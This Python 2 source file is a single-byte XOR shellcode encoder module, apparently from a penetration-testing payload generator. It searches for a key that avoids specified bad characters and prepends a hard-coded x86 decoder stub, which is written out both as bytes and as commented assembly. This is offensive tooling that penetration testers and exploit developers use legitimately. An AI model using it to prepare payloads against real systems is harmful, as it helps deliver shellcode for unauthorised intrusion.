#!/usr/bin/env python

# This xor encoder was developed completely by Justin Warner (@sixdub)
# Thanks a lot for letting us add this in!

import re
import sys


class EncoderModule:

    def __init__(self):
        self.name = "Single byte Xor Encoder"
        self.cli_name = "xor"
        self.description = "Single byte xor shellcode encoder"
        self.author = "Justin Warner (@sixdub)"
        self.bad_chars = None
        self.xor_key = 0x00
        self.shellcode = ""
        self.terminator = 0x00
        self.encoded_shellcode = ""
        self.encoded_payload_length = 0
        self.encoder_bad_chars = ["eb", "18", "5e", "8d", "3e", "31", "c0", "db", "8a","1c", "06", "80", "f3", "88", "1f", "47", "40", "ef", "e8", "e3", "ff"]
        self.misc_comments = """
            #This is the decoder stub
            #<_start>:
            #   eb 18                   jmp    40101a <call_shellcode>

            #<decoder>:
              #5e                       pop    %esi
              #8d 3e                    lea    (%esi),%edi
              #31 c0                    xor    %eax,%eax
              #31 db                    xor    %ebx,%ebx

            #<decode>:
              #8a 1c 06                 mov    (%esi,%eax,1),%bl
              #80 fb TERM               cmp    TERM,%bl
              #74 0e                    je     <encodedShellcode>
              #80 f3 KEY                xor    KEY,%bl
              #88 1f                    mov    %bl,(%edi)
              #47                       inc    %edi
              #40                       inc    %eax
              #eb ef                    jmp    <decode>

            #<call_shellcode>:
              #e8 e3 ff ff ff           call   <decoder>
      """

    def have_bad_chars(self, incoming, chars):
        for b in chars:
            if b in incoming:
                return True
        return False

    def shellcode_to_ascii(self, shell_code):
        output = ""
        for b in shell_code:
            output += "\\x%02x" % b
        return output

    def set_shellcode(self, shellcode):
        shellcode = shellcode.decode('string-escape')
        self.shellcode = bytearray(shellcode)
        return

    def set_bad_characters(self, bad_characters):
        final_bad_chars = []
        bad_characters = bad_characters.split('x')

        # Do some validation on the received characters
        for item in bad_characters:
            if item == '':
                pass
            elif item in self.encoder_bad_chars:
                print "[*] Encoder Error: Bad character specified is used for the decoder stub."
                print "[*] Encoder Error: Please use different bad characters or another encoder!"
                sys.exit()
            else:
                if len(item) == 2:
                    # Thanks rohan (@cptjesus) for providing this regex code, and making me too lazy
                    # to do it myself
                    rohan_re_code = re.compile('[a-f0-9]{2}',flags=re.IGNORECASE)
                    if rohan_re_code.match(item):
                        final_bad_chars.append(item)
                    else:
                        print "[*] Bad Character Error: Invalid bad character detected."
                        print "[*] Bad Character Error: Please provide bad characters in \\x00\\x01... format."
                        sys.exit()
                else:
                    print "[*] Bad Character Error: Invalid bad character detected."
                    print "[*] Bad Character Error: Please provide bad characters in \\x00\\x01... format."
                    sys.exit()
        self.bad_chars = [int("0x"+x, 16) for x in final_bad_chars]
        return

    # Takes a blob as input with a single byte key and returns blob output
    def xor(self, input, key):
        output = bytearray("")
        for b in bytearray(input):
            output.append(b ^ key)
        return output

    def do_the_magic(self):
        # This is where the encoding happens
        encode = bytearray("")

        # Test all possible keys and see if it creates a bad char. If not, we have a winner!
        remove_count = 0
        for test_key in range(1, 255):
            if not self.have_bad_chars(self.xor(self.shellcode, test_key), self.bad_chars):
                self.xor_key = test_key
                break
            else:
                remove_count += 1

        # Ensure a key was found... if not, error out
        if self.xor_key == 0x00:
            print "[*] ERROR: No key found... Stop being so picky and change your bad chars!"
            exit
        else:
            # XOR all the things
            # Justin, your code comments are awesome
            for x in bytearray(self.shellcode):
                encode.append(x ^ self.xor_key)
            skipped_term = 0

            # Iterate over code to find a non-used terminating char
            # that is not a badchar
            for i in range(1, 255):
                if i in bytearray(encode) or i in self.bad_chars:
                    skipped_term += 1
                else:
                    self.terminator = i
                    break

            # Build final payload with stub
            encode.append(self.terminator)
            decodestub = bytearray("\xeb\x18\x5e\x8d\x3e\x31\xc0\x31\xdb\x8a\x1c\x06\x80\xfb")
            decodestub.append(self.terminator)
            decodestub += bytearray("\x74\x0e\x80\xf3")
            decodestub.append(self.xor_key)
            decodestub += bytearray("\x88\x1f\x47\x40\xeb\xef\xe8\xe3\xff\xff\xff")
            complete = decodestub + encode
            self.encoded_payload_length = len(complete)

            #At this point, the shellcode is a byte array... now we convert to ASCII
            self.encoded_shellcode = self.shellcode_to_ascii(complete)
            return

    def all_the_stats(self, parsed_cli_object):
        print "Payload Type: " + parsed_cli_object.payload
        if parsed_cli_object.ip is None:
            print "IP Address: n/a"
        else:
            print "IP Address: " + parsed_cli_object.ip
        print "Port: " + str(parsed_cli_object.port)
        print "Encoder Name: " + self.name
        string_bad_chars = ''
        for bchar in self.bad_chars:
            string_bad_chars += str(hex(bchar)) + " "
        print "Bad Character(s): " + string_bad_chars
        print "Shellcode length: " + str(self.encoded_payload_length)
        print "Xor Key: " + str(hex(self.xor_key)) + "\n"
        return
